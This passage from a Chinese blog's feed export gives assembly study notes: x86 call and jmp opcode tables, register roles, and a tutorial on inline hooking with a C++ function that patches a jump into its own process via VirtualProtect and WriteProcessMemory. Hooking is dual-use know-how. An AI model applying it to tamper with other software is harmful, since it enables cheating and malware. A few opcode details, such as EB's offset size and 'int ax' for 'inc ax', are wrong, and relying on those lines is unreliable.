&#x3D; 段地址</span><br><span class="line">9A后面4个xx       &#x3D; 要call的地址</span><br><span class="line"></span><br><span class="line">push cs</span><br><span class="line">push eip</span><br><span class="line">jmp xx xx xx xx</span><br></pre></td></tr></table></figure><p>执行<code>call far ptr 标号</code>前的数据</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922183236795-1429433559.png" alt="image-20210922183236402"> </p><p>跟入call后的数据，注意堆栈的内容。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922190829064-1785248816.png" alt="image-20210922190825113"> </p><p>执行ret后</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922190849866-832177354.png" alt="image-20210922190846909"> </p><p>返回到了call调用处</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922190917233-1739319645.png" alt="image-20210922190914295"> </p><h3 id="call-指令大全图表"><a href="#call-指令大全图表" class="headerlink" title="call 指令大全图表"></a>call 指令大全图表</h3><p>表格</p><table><thead><tr><th>指令</th><th>二进制格式</th></tr></thead><tbody><tr><td>call rel32</td><td>E8 xx xx xx xx</td></tr><tr><td>call dword ptr [EAX]</td><td>FF 10</td></tr><tr><td>call dword ptr [ECX]</td><td>FF 11</td></tr><tr><td>call dword ptr [edx]</td><td>FF 12</td></tr><tr><td>call dword ptr [ebx]</td><td>FF 13</td></tr><tr><td>call dword ptr [REG * SCALE+BASE]</td><td>FF 14 xx</td></tr><tr><td>call dword ptr [Address]</td><td>FF 15 xx xx xx xx</td></tr><tr><td>call dword ptr [ESI]</td><td>FF 16</td></tr><tr><td>call dword ptr [EDI]</td><td>FF 17</td></tr><tr><td>call dword ptr [EAX+xx]</td><td>FF 50 xx</td></tr><tr><td>call dword ptr [ECX+xx]</td><td>FF 51 xx</td></tr><tr><td>call dword ptr [EDX+xx]</td><td>FF 52 xx</td></tr><tr><td>call dword ptr [EBX+xx]</td><td>FF 53 xx</td></tr><tr><td>call dword ptr [REG*SCALE+BASE+offset8]</td><td>FF 54 xx xx</td></tr><tr><td>call dword ptr [EBP+xx]</td><td>FF 55 xx</td></tr><tr><td>call dword ptr [ESI+xx]</td><td>FF 56 xx</td></tr><tr><td>call dword ptr [EDI+xx]</td><td>FF 57 xx</td></tr><tr><td>call dword ptr [EAX+xxxxxxxx]</td><td>FF 90 xx xx xx xx</td></tr><tr><td>call dword ptr [ECX+xxxxxxxx]</td><td>FF 91 xx xx xx xx</td></tr><tr><td>call dword ptr [EDX+xxxxxxxx]</td><td>FF 92 xx xx xx xx</td></tr><tr><td>call dword ptr [EBX+xxxxxxxx]</td><td>FF 93 xx xx xx xx</td></tr><tr><td>call dword ptr [REG*SCALE+BASE+offset32]</td><td>FF 94 xx xx xx xx xx</td></tr><tr><td>call dword ptr [EBP+xxxxxxxx]</td><td>FF 95 xx xx xx xx</td></tr><tr><td>call dword ptr [ESI+xxxxxxxx]</td><td>FF 96 xx xx xx xx</td></tr><tr><td>call dword ptr [EDI+xxxxxxxx]</td><td>FF 97 xx xx xx xx</td></tr><tr><td>call eax</td><td>FF D0</td></tr><tr><td>call ecx</td><td>FF D1</td></tr><tr><td>call edx</td><td>FF D2</td></tr><tr><td>call ebx</td><td>FF D3</td></tr><tr><td>call esp</td><td>FF D4</td></tr><tr><td>call ebp</td><td>FF D5</td></tr><tr><td>call esi</td><td>FF D6</td></tr><tr><td>call edi</td><td>FF D7</td></tr><tr><td>call FAR seg16:Address</td><td>9A xx xx xx xx xx xx</td></tr></tbody></table><p>图</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210922174223474-1634946666.jpg" alt="1"> </p><blockquote><p>参考资料：<br><a href="https://zhuanlan.zhihu.com/p/68588184">https://zhuanlan.zhihu.com/p/68588184</a> CALL指令有多少种写法<br><a href="https://blog.csdn.net/qq_39654127/article/details/88698911">https://blog.csdn.net/qq_39654127/article/details/88698911</a> 王爽《汇编语言》笔记（详细）</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;call和ret指令概述：&quot;&gt;&lt;a href=&quot;#call和ret指令概述：&quot; class=&quot;headerlink&quot; title=&quot;call和ret指令概述：&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="黑魔法" scheme="https://vxer-lee.github.io/tags/%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>转移指令原理和Inline Hook</title>
    <link href="https://vxer-lee.github.io/2021/09/18/DoSASM/JmpAndHook/"/>
    <id>https://vxer-lee.github.io/2021/09/18/DoSASM/JmpAndHook/</id>
    <published>2021-09-18T13:13:08.000Z</published>
    <updated>2021-09-18T13:25:34.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="转移指令"><a href="#转移指令" class="headerlink" title="转移指令"></a>转移指令</h2><p><code>可以修改IP，或同时可以修改CS和IP的指令统称为：转移指令</code></p><p><code>8086CPU</code>的<code>转移行为</code>有以下几类：</p><ul><li>只修改IP时，称为段内转移，比如：jmp ax。</li><li>同时修改CS和IP时，称为段间转移，比如：jmp 1000:0。</li></ul><p>由于转移指令对<code>IP的修改范围</code>不同，段内转移又分为：短转移和近转移。</p><ul><li>短转移IP的修改范围为-128~127(0xFF)</li><li>近转移IP的修改范围为-32768~32767(0xFFFF)</li></ul><p><code>8086CPU</code>的<code>转移指令</code>分为以下几类：</p><ul><li>无条件转移指令（jmp）</li><li>条件转移指令（jnz jz..）</li><li>循环指令（loop）</li><li>过程</li><li>中断（int）</li></ul><h2 id="操作符offset"><a href="#操作符offset" class="headerlink" title="操作符offset"></a>操作符offset</h2><p>操作符offset是伪指令，在汇编语言中由编译器处理的符号，它的功能是<code>取得标号的偏移地址</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918143140531-2008352147.png" alt="image-20210918143138015"> </p><h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP。</p><p>jmp指令要给出两种信息：</p><ul><li>(1) 转移的目的地址</li><li>(2) 转移的距离（段间转移、段内短转移、段内近转移）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp short 标号</span><br><span class="line">jmp near ptr 标号</span><br><span class="line">jcxz 标号</span><br><span class="line">loop 标号 等几种汇编指令，它们对 IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。在它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移距离。</span><br></pre></td></tr></table></figure><h2 id="根据位移进行转移的jmp指令"><a href="#根据位移进行转移的jmp指令" class="headerlink" title="根据位移进行转移的jmp指令"></a>根据位移进行转移的jmp指令</h2><p><code>jmp short 标号</code>（段内短转移）</p><p>指令“<code>jmp short 标号</code>”的功能为<code>(IP)=(IP)+8位位移</code>，转到标号处执行指令</p><ul><li>8位位移 = “标号”处的地址 - jmp指令后的第一个字节的地址；</li><li>short指明此处的位移为8位位移动；</li><li>8位位移的范围为(-128~127)，用补码表示。  也就是最大一个字节(0xFF)</li><li>8位位移由编译程序在编译时算出</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918144623663-219091642.png" alt="image-20210918144622021"> </p><p>编译后标号被翻译成了位移。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918145107101-354257289.png" alt="image-20210918145105557"> </p><p>CPU不需要这个目的地址就可以实现对IP的修改。这里是依据位移进行转移。</p><p>jmp short s指令的读取和执行过程如下：</p><ul><li>(1) (CS)=076C,(IP)=0000，执行完<code>mov ax,0</code>后CS:IP指向了<code>EB 03</code>(jmp short s机器码)；</li><li>(2) 读取指令码<code>EB 03</code>进入指令缓冲器；</li><li>(3) (IP) = (IP) + 所读取指令的长度 = (IP) + 2 = 5，CS:IP指向了add ax,1；</li><li>(4) CPU执行指令缓冲器中的指令<code>EB 03</code>；</li><li>(5) 指令执行后<code>IP+位移</code>=(IP) + 3 = 8，CS:IP(076C:0008) 指向-&gt;inc ax</li></ul><h2 id="插播HOOK知识"><a href="#插播HOOK知识" class="headerlink" title="插播HOOK知识"></a>插播HOOK知识</h2><p>这里插播点<code>X86</code>平台下的hook知识，看到这里我们已经知道了我们可以通过修改ip的方式来让代码跳到想要的地方执行代码。</p><h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>inline hook是一种通过修改机器码的方式来实现hook的技术。</p><p>在没有学汇编知识前，我们可能对Hook这种技术感到很深奥，觉得这简直是一种黑魔法，凭什么他就能把正常函数替换成我们自己的假函数。</p><h3 id="Inline-Hook-原理"><a href="#Inline-Hook-原理" class="headerlink" title="Inline Hook 原理"></a>Inline Hook 原理</h3><p>当我们学习了王爽老师的汇编知识后，才明白原来在底层，CPU是根据ip寄存器来控制我们要执行的指令处的。</p><p>而学习了《王爽汇编第9章转移指令的原理》后，了解了可以通过jmp指令来修改ip寄存器，目前我们已经学习了短转移的使用，这已经足够用来学HOOK了。 </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918160641539-1461236271.png" alt="image-20210918160639667"> </p><p>打开OD载入程序，然后找到执行demo函数的汇编代码处，再利用我们今天刚学的短转移知识进行机器码的修改。</p><p>首先经过单步调试后，我找到了执行demo函数处的位置，我们先记下他下条指令的地址<code>0x00481885</code>。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918161229851-1188553784.png" alt="image-20210918161228301"> </p><p>接着我们需要找到<code>标号</code>处，也就是<code>fake_demo</code>函数处，也记下地址<code>0x004817D0</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918161736599-1281580491.png" alt="image-20210918161734983"> </p><p>好了，最后的步骤就是改机器码，根据公式计算出位移：<code>-181(0xFFFFFF4B)</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918170436048-1143709016.png" alt="image-20210918170433891"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918170703443-874850949.png" alt="image-20210918170702265"> </p><p>最后来执行一遍：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918170737726-1528159212.png" alt="image-20210918170736257"> </p><h3 id="Hook代码开发"><a href="#Hook代码开发" class="headerlink" title="Hook代码开发"></a>Hook代码开发</h3><p>在了解了Hook原理后，甚至我们用手动方式实现了HOOK后，就有了思路来代码开发了。</p><p>在此之前让我们先来认识两个函数<code>WriteProcessMemory</code>、<code>VirtualProtect</code></p><ul><li>WriteProcessMemory函数可以对进程的内存进行写入，这样我们就可以修改，写入机器码了。</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918172320244-2144817826.png" alt="image-20210918172319045"> </p><ul><li>VirtualProtect函数可以更改虚拟内存中的访问保护，在Win32中代码段具有写保护，所以我们无法直接写入，可以利用此函数修改保护后再调用WriteProcessMemory修改和写入机器码。</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918172653005-1631893331.png" alt="image-20210918172651511"> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*************************************************</span></span><br><span class="line"><span class="comment"> *功能：内联HOOK 函数，可以劫持函数的原本流程</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *函数名：InlineHook</span></span><br><span class="line"><span class="comment"> *参数：(原函数地址)、(fake函数地址)</span></span><br><span class="line"><span class="comment"> *by: 《王爽汇编笔记》</span></span><br><span class="line"><span class="comment"> ************************************************/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InlineHook</span><span class="params">(DWORD dwHookAddr, LPVOID pFunAddr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BYTE jmpCode[<span class="number">5</span>] = &#123;<span class="number">0xE9</span>&#125;;</span><br><span class="line">    <span class="comment">//计算偏移</span></span><br><span class="line">    *(DWORD*)(&amp;jmpCode[<span class="number">1</span>]) = (DWORD)pFunAddr - dwHookAddr - <span class="number">5</span>;</span><br><span class="line">    <span class="comment">// 保存以前的属性用于还原</span></span><br><span class="line">    DWORD OldProtext = <span class="number">0</span>;</span><br><span class="line">    DWORD dwWritten;</span><br><span class="line">    <span class="comment">// 因为要往代码段写入数据，又因为代码段是不可写的，所以需要修改属性</span></span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)dwHookAddr, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldProtext);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(<span class="built_in">GetCurrentProcess</span>(), (FARPROC)dwHookAddr, jmpCode, <span class="number">5</span>, &amp;dwWritten);</span><br><span class="line">    <span class="built_in">VirtualProtect</span>((LPVOID)dwHookAddr, <span class="number">5</span>, OldProtext, &amp;OldProtext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//故意让程序暂停</span></span><br><span class="line">    <span class="built_in">getchar</span>();</span><br><span class="line">    <span class="comment">//执行函数</span></span><br><span class="line">    <span class="built_in">InlineHook</span>((DWORD)&amp;demo, &amp;fake_demo);</span><br><span class="line">    <span class="built_in">demo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><p><code>jmp far ptr 标号</code>(远转移、段间转移)</p><ul><li>(CS) = 标号所在段的段地址;</li><li>(IP) = 标号所在段中的偏移地址。</li><li>far ptr 指明了指令用标号的<code>段地址 和 偏移地址</code>修改 <code>CS和IP</code>。</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918203636137-886924868.png" alt="image-20210918203632593"> </p><p>在<code>Win32</code>中的<code>远转移</code>可以跳到其他DLL的空间，其中关键的机器码是<code>0xFF25</code> + 目标地址</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918203920782-2082657891.png" alt="image-20210918203919798">  </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918204106980-521533007.png" alt="image-20210918204105999"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918204134570-1795939212.png" alt="image-20210918204133578"> </p><h2 id="转移地址在寄存器或内存中的jmp指令"><a href="#转移地址在寄存器或内存中的jmp指令" class="headerlink" title="转移地址在寄存器或内存中的jmp指令"></a>转移地址在寄存器或内存中的jmp指令</h2><p><code>jmp 16位寄存器</code>功能：<code>IP=(16位寄存器)[段内转移]</code></p><p>转移地址在内存中的jmp指令有两周格式：</p><ul><li>jmp word ptr […] (段内转移)</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918205234237-1010668954.png" alt="image-20210918205233143"> </p><ul><li>jmp dword ptr […] (段间转移)</li></ul><p>功能：从内存单元地址处开始存放着两个字，<code>高地址</code>出的字是转移目的<code>段地址</code>，<code>低地址</code>处是转移目的<code>偏移地址</code>。</p><p>1：(CS) = (内存单元地址+2)</p><p>2：(IP) = (内存单元地址)</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210918205537550-1594805525.png" alt="image-20210918205536587"> </p><h2 id="jcxz指令和loop指令"><a href="#jcxz指令和loop指令" class="headerlink" title="jcxz指令和loop指令"></a>jcxz指令和loop指令</h2><h3 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h3><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的<code>位移</code>，<code>而不是目的地址</code>。对IP的修改范围都为-128~127(0xff)。</p><p>指令格式：jcxz <code>标号</code> (如果<code>cx=0</code>,则转移到标号处执行。)</p><p>当(cx) = 0时，(IP) = (IP) + 8位位移</p><ul><li>8位位移 = “标号” 处的地址 - jcxz指令后的第一个字节的地址；</li><li>8位位移的范围为-128~127，用补码表示；</li><li>8位位移由编译程序在编译时算出。</li></ul><p>当(cx)!=0时，程序向下执行什么都不做！</p><h3 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h3><p>loop指令为循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的<code>位移</code>，而不是目的地址。</p><p>对IP的修改范围都为-128~127(0xFF)。</p><p>指令格式：loop <code>标号</code> ((cx) = (cx) - 1，如果<code>(cx) ≠ 0</code>，转移到标号处执行)。</p><p>(cx) = (cx) - 1；如果 (cx) != 0，(IP) = (IP) + 8位位移。</p><ul><li>8位位移 = “”标号””处的地址 - loop指令后的第一个字节的地址；</li><li>8位位移的范围为-128~127，用补码表示；</li><li>8位位移由编译程序在编译时算出。</li></ul><p>如果（cx）= 0，什么也不做（程序向下执行）。</p><h2 id="几种跳转指令和对应的机器码"><a href="#几种跳转指令和对应的机器码" class="headerlink" title="几种跳转指令和对应的机器码"></a>几种跳转指令和对应的机器码</h2><p>注：(Win32 x86架构下)</p><table><thead><tr><th>机器码</th><th>指令</th><th align="center">解释</th></tr></thead><tbody><tr><td>0xE8</td><td>CALL</td><td align="center">后面的四个字节是地址 (近转移)</td></tr><tr><td>0xE9</td><td>JMP</td><td align="center">后面的四个字节是偏移 (近转移)</td></tr><tr><td>0xEB</td><td>JMP</td><td align="center">后面的二个字节是偏移 (近转移 8086)</td></tr><tr><td>0xFF15</td><td>CALL</td><td align="center">后面的四个字节是存放地址的地址 (远转移)</td></tr><tr><td>0xFF25</td><td>JMP</td><td align="center">后面的四个字节是存放地址的地址 (远转移)</td></tr><tr><td>0x68</td><td>PUSH</td><td align="center">后面的四个字节入栈</td></tr><tr><td>0x6A</td><td>PUSH</td><td align="center">后面的一个字节入栈</td></tr></tbody></table><blockquote><p>参考文献：<br><a href="https://www.cnblogs.com/Archimedes/p/14823218.html">https://www.cnblogs.com/Archimedes/p/14823218.html</a> inline hook原理和实现<br><a href="https://blog.csdn.net/wzsy/article/details/17163589">https://blog.csdn.net/wzsy/article/details/17163589</a> 几种跳转指令和对应的机器码<br><a href="https://blog.csdn.net/qq_39654127/article/details/88698911">https://blog.csdn.net/qq_39654127/article/details/88698911</a> 王爽《汇编语言》笔记（详细）<br>《王爽汇编第四版 第9章》</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;转移指令&quot;&gt;&lt;a href=&quot;#转移指令&quot; class=&quot;headerlink&quot; title=&quot;转移指令&quot;&gt;&lt;/a&gt;转移指令&lt;/h2&gt;&lt;p&gt;&lt;code&gt;可以修改IP，或同</summary>
      
    
    
    
    <category term="PC逆向" scheme="https://vxer-lee.github.io/categories/PC%E9%80%86%E5%90%91/"/>
    
    
    <category term="黑魔法" scheme="https://vxer-lee.github.io/tags/%E9%BB%91%E9%AD%94%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>汇编寄存器知识详解</title>
    <link href="https://vxer-lee.github.io/2021/09/15/DoSASM/Register/"/>
    <id>https://vxer-lee.github.io/2021/09/15/DoSASM/Register/</id>
    <published>2021-09-15T07:14:34.000Z</published>
    <updated>2021-09-17T07:07:48.000Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="寄存器知识"><a href="#寄存器知识" class="headerlink" title="寄存器知识"></a>寄存器知识</h2><p>一个典型的CPU由运算器、控制器、寄存器（CPU工作原理）等器件构成，这些器件靠内部总线相连。</p><ul><li><p>运算器进行信息处理(运算单元)</p></li><li><p>寄存器进行信息存储(存储单元)</p></li><li><p>控制器负责控制各种器件工作(控制单元)</p></li></ul><p>8086CPU中一共有14 个寄存器，所有寄存器都是16位宽，存2个字节，因为是完全的16位微处理器。</p><p><strong>AX，BX，CX，DX，SP，BP，SI，DI，IP，FLAG，CS，DS，SS，ES</strong></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910152048114-1326748982.png" alt="image-20210910152047631">  </p><p>这 14 个寄存器有可能进行具体的划分，按照功能可以分为五种：</p><ul><li>通用寄存器</li><li>段寄存器</li><li>偏移寄存器</li><li>IP寄存器</li><li>标志寄存器</li></ul><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>通用寄存器有4个：<strong>AX，BX，CX，DX</strong>，一般用来存放数据，也被称为数据寄存器。</p><p>它们可分为两个可独立使用的8位寄存器</p><p>如下图所示。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210917150739854-364387020.png" alt="img">  </p><p>8086CPU可以一次性处理以下两种尺寸的数据。</p><ul><li>字节：记为byte，一个字节由8个bit组成，可以存在8位寄存器中。</li><li>字：记为word，一个字由两个字节组成，可以存在一个16位寄存器中(16位CPU)</li></ul><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910153933086-518328246.png" alt="image-20210910153932483"> </p><p>8086采用小端模式：高地址存放高位字节，低地址存放低位字节。</p><p>一个8位寄存器所能存储的数据范围是：0~255  (2的8次方-1)</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910154911918-1072265149.png" alt="image-20210910154911376">  </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910155428142-1942123238.png" alt="image-20210910155427382"> </p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910155506558-1959504272.png" alt="image-20210910155506131"> </p><h3 id="AX寄存器-累加寄存器"><a href="#AX寄存器-累加寄存器" class="headerlink" title="AX寄存器(累加寄存器)"></a>AX寄存器(累加寄存器)</h3><p>AX也叫做累加寄存器，主要用于输入/输出大规模的指令运算。</p><p>以下例子是我在Windows下编译的32位汇编，其中AX扩展成了EAX，我们可以看见乘法(累加)后的结果他其实就是保存到了EAX中，然后再将EAX赋值给整型变量c，所以<code>乘法(imul)</code>和<code>除法(div)</code>运算都会用到AX寄存器,除法会将商保存到ax中，余数保存到dx中。</p><p>编译命令：<code>cl -FAS .\1.cpp</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210910201433297-1080400618.png" alt="image-20210910201432823"> </p><p>可以利用文章<a href="https://www.cnblogs.com/VxerLee/p/15264290.html%E4%B8%AD%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%86C%E8%AF%AD%E8%A8%80%E8%BD%AC%E6%8D%A2%E6%88%90DOS%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%EF%BC%8C%E7%84%B6%E5%90%8E%E5%AF%B9%E6%AF%94%E6%BA%90%E7%A0%81%E5%92%8C%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81%E5%8F%91%E7%8E%B0%E4%B9%98%E6%B3%95%E7%BB%93%E6%9E%9C%E7%A1%AE%E5%AE%9E%E4%BC%9A%E6%94%BE%E5%85%A5%E5%88%B0ax%E4%B8%AD%E3%80%82">https://www.cnblogs.com/VxerLee/p/15264290.html中的方法将C语言转换成DOS汇编代码，然后对比源码和汇编代码发现乘法结果确实会放入到ax中。</a></p><p>乘法：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210913191410625-1490516214.png" alt="image-20210913191410502"> </p><p>除法(取余数)：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914111834382-1680646863.png" alt="image-20210914111835202"> </p><p>ax还常常被用作函数的返回值。</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914114159904-621011746.png" alt="image-20210914114159719"> </p><h3 id="BX寄存器-寻址寄存器"><a href="#BX寄存器-寻址寄存器" class="headerlink" title="BX寄存器(寻址寄存器)"></a>BX寄存器(寻址寄存器)</h3><p>bx叫做数据寄存器，用来暂存一般数据，不过用的最多的还是用来寻址，bx存放偏移地址，然后根据基地址+偏移进行物理内存地址的定位。</p><p>暂存一般数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov bx,2</span><br><span class="line">add bx,bx</span><br><span class="line">mov ax,bx</span><br></pre></td></tr></table></figure><p>用bx寻址：</p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914135730973-410497026.png" alt="image-20210914135730744"> </p><h3 id="CX寄存器-计数寄存器"><a href="#CX寄存器-计数寄存器" class="headerlink" title="CX寄存器(计数寄存器)"></a>CX寄存器(计数寄存器)</h3><p>cx也是叫做数据寄存器,也能暂存一般数据，不过cx还有个专门的用途，根据字面意思c - &gt; “Count”,用来在Loop(循环)时候，用cx寄存器来进行计数指定循环的次数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mov  cx,10  ;循环10次</span><br><span class="line">xor  ax,ax</span><br><span class="line">xor  bx,bx  ;存放sum</span><br><span class="line">s:</span><br><span class="line">int ax  ;</span><br><span class="line">add bx,ax;&#x2F;bx &#x3D; 1+2+3+4+5+6+7+8+9+10</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>除此之外在Win32汇编中,ecx经常会作为类指针进行传入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span>    age;</span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Cat::run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;I&#x27;m a Cat.&quot;</span>  &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;My Name is &quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;name &lt;&lt; endl;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;age=%d\n&quot;</span>,<span class="keyword">this</span>-&gt;age);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m Running.....\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cat maomi;</span><br><span class="line">maomi.age  = <span class="number">2</span>;</span><br><span class="line">maomi.name = <span class="string">&quot;xiaohui&quot;</span>;</span><br><span class="line">maomi.<span class="built_in">run</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行反汇编后可以发现代码调用<code>maomi.run()</code>的时候会把<code>this指针</code>传入<code>ecx</code>寄存器。<code>lea ecx,dword ptr ss:[x]</code></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914145438233-1765858574.png" alt="image-20210914145439088"></p><p><img src="https://img2020.cnblogs.com/blog/2080041/202109/2080041-20210914150006818-1741575232.png" alt="image-20210914150007810"> </p><h3 id="DX寄存器"><a href="#DX寄存器" class="headerlink" 